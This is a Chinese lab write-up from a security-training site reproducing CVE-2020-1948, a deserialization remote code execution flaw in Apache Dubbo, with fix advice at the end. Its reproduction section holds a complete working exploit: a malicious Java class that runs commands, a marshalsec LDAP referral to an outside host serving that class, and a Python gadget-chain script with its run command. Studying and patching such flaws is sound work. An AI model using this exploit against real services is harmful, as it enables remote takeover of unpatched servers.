本文首发于“合天网安实验室” 作者：合天网安学院

 **本文涉及靶场同款知识点练习**

[ 实验:CVE-2020-1948 Apache
dubbo远程命令执行漏洞(合天网安实验室)](https://www.hetianlab.com/expc.do?w=exp_ass&ec=ECID39ef-c0db-4835-b19f-62f9d8d70d55&pk_campaign=freebuf-wemedia)  

通过该实验了解漏洞产生的原因，掌握基本的漏洞利用及使用方法，并能给出加固方案。

## 简介

Dubbo是阿里巴巴公司开源的一个高性能优秀的服务框架，使得应用可通过高性能的RPC实现服务的输出和输入功能，可以和Spring框架无缝集成。它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。

## 概述

2020年06月23日， Apache Dubbo 官方发布了Apache Dubbo
远程代码执行的风险通告，该漏洞编号为CVE-2020-1948，漏洞等级：高危。 Apache Dubbo是一款高性能、轻量级的开源Java
RPC框架，它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。 Apache Dubbo
Provider存在反序列化漏洞，攻击者可以通过RPC请求发送无法识别的服务名称或方法名称以及一些恶意参数有效载荷，当恶意参数被反序列化时，可以造成远程代码执行。

## 影响版本

Dubbo 2.7.0 - 2.7.6 Dubbo 2.6.0 - 2.6.7 Dubbo 2.5.x （官方不再维护）

## 环境搭建

运行环境与编译exp环境jdk版本均为8u121，启动测试环境

java -jar dubbo.jar

启动后会监听12345端口

## 漏洞复现

服务指纹：

PORT STATE SERVICE VERSION 12345/tcp opentextui Alibaba Dubbo remoting telnetd

构造poc，我们这里执行一个ping命令来验证是否可以执行命令，新建calc.java，

importjavax.naming.Context;importjavax.naming.Name;importjavax.naming.spi.ObjectFactory;importjava.util.Hashtable;publicclasscalc
implementsObjectFactory{@OverridepublicObjectgetObjectInstance(Objectobj,Namename,ContextnameCtx,Hashtable<?,?>environment)throwsException{Runtime.getRuntime().exec("ping
test.sr3uwk.ceye.io");returnnull;}}

编译poc

javac calc.java

将编译好的poc（calc.class）放到web网站目录里，确保漏洞主机可以访问到
使用marshalsec项目启动一个ldap代理服务，marshalsec下载：

https://github.com/RandomRobbieBF/marshalsec-jar/raw/master/marshalsec-0.0.3-SNAPSHOT-all.jar

启动LDAP代理服务，执行该命令ldap服务会监听8086端口

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar
marshalsec.jndi.LDAPRefServerhttp://139.9.198.30/#calc 8086

执行测试脚本，此处测试使用python环境为3.8.0，先安装依赖包

python3 -m pip install dubbo-py

脚本内容(Dubbo.py)：

# -*- coding: utf-8 -*-importsys fromdubbo.codec.hessian2
importDecoder,new_object fromdubbo.client importDubboClient
iflen(sys.argv)<4:print('Usage: python {} DUBBO_HOST DUBBO_PORT
LDAP_URL'.format(sys.argv[0]))print('\nExample:\n\n- python {} 1.1.1.1 12345
ldap://1.1.1.6:80/exp'.format(sys.argv[0]))sys.exit()client
=DubboClient(sys.argv[1],int(sys.argv[2]))JdbcRowSetImpl=new_object('com.sun.rowset.JdbcRowSetImpl',dataSource=sys.argv[3],strMatchColumns=["foo"])JdbcRowSetImplClass=new_object('java.lang.Class',name="com.sun.rowset.JdbcRowSetImpl",)toStringBean=new_object('com.rometools.rome.feed.impl.ToStringBean',beanClass=JdbcRowSetImplClass,obj=JdbcRowSetImpl
)resp
=client.send_request_and_return_response(service_name='org.apache.dubbo.spring.boot.sample.consumer.DemoService',#
此处可以是 $invoke、$invokeSync、$echo 等，通杀 2.7.7 及 CVE
公布的所有版本。method_name='$invoke',args=[toStringBean])output =str(resp)if'Fail to
decode request due to: RpcInvocation'inoutput:print('[!] Target maybe not
support deserialization.')elif'EXCEPTION: Could not complete class
com.sun.rowset.JdbcRowSetImpl.toString()'inoutput:print('[+]
Succeed.')else:print('[!] Output:')print(output)print('[!] Target maybe not
use dubbo-remoting library.')

执行脚本

python3 Dubbo.py 192.168.137.17312345ldap://139.9.198.30:8086/calc

![](https://image.3001.net/images/20201202/1606891200_5fc736c0d658fabdd6d0b.png!small)dnslog查看，成功接收到请求![](https://image.3001.net/images/20201202/1606891957_5fc739b5b087009ec0323.png!small)

ldap服务也可以看到请求转发![](https://image.3001.net/images/20201202/1606891969_5fc739c1099d932165025.png!small)

弹计算器

import javax.naming.Context; import javax.naming.Name; import
javax.naming.spi.ObjectFactory; import java.util.Hashtable; public class calc
implements ObjectFactory { @Override public Object getObjectInstance(Object
obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception
{ Runtime.getRuntime().exec("calc"); return null; } }

## 漏洞修复

升级 2.7.7 版本，并根据以下链接的方法进行参数校验

[https://github.com/apache/dubbo/pull/6374/commits/8fcdca112744d2cb98b349225a4aab365af563de](https://github.com/apache/dubbo/pull/6374/commits/8fcdca112744d2cb98b349225a4aab365af563de)  

更换协议以及反序列化方式。具体更换方法可参考：

[http://dubbo.apache.org/zh-cn/docs/user/references/xml/dubbo-protocol.html](http://dubbo.apache.org/zh-cn/docs/user/references/xml/dubbo-protocol.html)  

## 参考

[https://github.com/DSO-Lab/defvul/wiki/Apache-Dubbo-CVE_2020_1948-Deserialization-Vulnerability](https://github.com/DSO-Lab/defvul/wiki/Apache-Dubbo-CVE_2020_1948-Deserialization-Vulnerability)  

